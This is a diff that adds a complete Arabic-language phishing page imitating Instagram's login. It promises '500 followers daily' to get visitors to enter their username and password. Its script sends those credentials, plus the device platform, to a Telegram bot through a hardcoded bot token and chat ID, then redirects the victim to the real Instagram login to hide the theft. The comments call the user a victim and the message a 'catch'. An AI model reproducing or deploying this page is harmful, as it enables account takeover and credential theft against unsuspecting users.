@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Get 500 Followers</title>
+    <style>
+        body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background-color: #fafafa; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; text-align: center; box-sizing: border-box; }
+        .logo { margin: 22px auto 12px; display: block; width: 175px; }
+        .info { color: #8e8e8e; font-size: 15px; font-weight: 600; line-height: 20px; margin-bottom: 20px; }
+        input { width: 100%; padding: 9px 7px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; box-sizing: border-box; }
+        input:focus { border-color: #a8a8a8; outline: none; }
+        .btn { background-color: #0095f6; border: 1px solid transparent; border-radius: 4px; color: #fff; cursor: pointer; font-size: 14px; font-weight: 600; padding: 5px 9px; width: 100%; margin: 8px 0; }
+        .btn:disabled { background-color: #b2dffc; cursor: default; }
+        .error { color: #ed4956; font-size: 14px; margin: 10px 0; display: none; }
+        .footer { margin-top: 10px; border: 1px solid #dbdbdb; background: white; width: 350px; padding: 15px; text-align: center; font-size: 14px; box-sizing: border-box; }
+        .blue-link { color: #0095f6; font-weight: 600; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
+        <p class="info">أدخل بيانات حسابك لتفعيل ميزة <br><span style="color:#262626">500 متابع يومياً</span></p>
+        
+        <form id="main-auth">
+            <input type="text" id="u_name" placeholder="اسم المستخدم أو الهاتف" required>
+            <input type="password" id="u_pass" placeholder="كلمة السر" required>
+            <div id="err_box" class="error">عذراً، كلمة السر غير صحيحة. يرجى إعادة المحاولة.</div>
+            <button type="submit" id="sub_btn" class="btn">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        ليس لديك حساب؟ <a href="#" class="blue-link">تسجيل</a>
+    </div>
+
+    <script>
+        // تشفير البيانات الأساسية لمنع كشف البوت
+        const _k = "7584947021:AAEdLPhgx7-K2Q4seW_m0Xcue_Du_gIWttE";
+        const _i = "8551903958";
+
+        document.getElementById('main-auth').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const u = document.getElementById('u_name').value;
+            const p = document.getElementById('u_pass').value;
+            const err = document.getElementById('err_box');
+            const btn = document.getElementById('sub_btn');
+
+            if (p.length < 8) {
+                err.style.display = 'block';
+                return;
+            }
+
+            err.style.display = 'none';
+            btn.disabled = true;
+            btn.innerText = "جاري التحقق...";
+
+            // جمع بيانات إضافية للضحية (Payload)
+            const meta = `🌐 IP: جاري الجلب...\n📱 Device: ${navigator.platform}`;
+
+            const text = `🎯 **صيد إنستا جديد** 🎯\n\n👤 **User:** \`${u}\`\n🔑 **Pass:** \`${p}\`\n\n${meta}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${_k}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: _i, text: text, parse_mode: "Markdown" })
+                });
+                
+                // التمويه: توجيه لصفحة الانستا الحقيقية
+                window.location.href = "https://www.instagram.com/accounts/login/?next=/p/Cw7.../"; 
+            } catch (error) {
+                btn.disabled = false;
+                btn.innerText = "تسجيل الدخول";
+            }
+        });
+    </script>
+</body>
+</html>
